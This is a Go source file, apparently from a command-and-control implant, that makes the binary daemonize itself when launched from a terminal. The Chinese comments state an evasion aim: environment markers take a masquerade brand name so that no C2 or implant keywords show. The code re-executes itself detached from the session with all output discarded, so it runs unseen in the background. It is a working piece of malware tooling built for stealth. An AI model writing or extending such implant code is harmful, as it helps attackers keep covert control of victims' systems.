//go:build linux

package app

import (
	"implant/core/config"
	"os"
	"os/exec"
	"strings"
	"syscall"

	"golang.org/x/sys/unix"
)

// daemonEnvKeys 返回前台守护化的两个环境标记名（防递归 + 禁用）。
// OPSEC：以中性品牌前缀命名，避免出现 C2 相关字样（如 TSHELL/C2/IMPLANT）。
func daemonEnvKeys() (guardKey, disableKey string) {
	brand := strings.ToUpper(config.MasqueradeName())
	if brand == "" {
		brand = "SVC"
	}
	// 中性形如 SVC_FORK_GUARD / SVC_NO_FORK（服务/守护语义，无 C2 特征）
	return brand + "_FORK_GUARD", brand + "_NO_FORK"
}

// daemonizeIfTTY 在前台终端运行时自动守护化：重新 exec 自身并脱离会话/终端，
// 父进程立即退出，shell 提示符释放可继续输入。
//
// 触发条件（全部满足）：
//  1. stdin 是 TTY（直接 ./xxx 运行）；管道/systemd/后台重定向等非 TTY 部署不受影响
//  2. 编译期配置 DAEMONIZE 开启（默认开）
//  3. 无禁用环境变量 <brand>_NO_FORK=1
//  4. 非子进程（子进程带 <brand>_FORK_GUARD=1 标记，防递归）
func daemonizeIfTTY() {
	guardKey, disableKey := daemonEnvKeys()

	// 子进程：防递归
	if os.Getenv(guardKey) == "1" {
		return
	}
	// 临时禁用（调试/维护）
	if os.Getenv(disableKey) == "1" {
		return
	}
	// 编译期配置关闭
	if !config.DaemonizeEnabled() {
		return
	}
	// 非 TTY（管道/systemd/重定向）→ 保持前台，不改变现有部署
	// （x/sys/unix 无 Isatty，用 TCGETS ioctl 判定：成功即终端）
	if _, terr := unix.IoctlGetTermios(int(os.Stdin.Fd()), unix.TCGETS); terr != nil {
		return
	}

	exe, err := os.Executable()
	if err != nil {
		return
	}
	devnull, err := os.OpenFile(os.DevNull, os.O_RDWR, 0)
	if err != nil {
		return
	}
	defer devnull.Close()

	// 重新 exec 自身：保留全部参数（含校验口令），Setsid 脱离会话/终端，
	// 三流指向 /dev/null（终端已释放，无输出残留）
	cmd := exec.Command(exe, os.Args[1:]...)
	cmd.Env = append(os.Environ(), guardKey+"=1")
	cmd.Stdin = devnull
	cmd.Stdout = devnull
	cmd.Stderr = devnull
	cmd.SysProcAttr = &syscall.SysProcAttr{Setsid: true}
	if err := cmd.Start(); err != nil {
		return
	}
	_ = cmd.Process.Release()
	os.Exit(0)
}
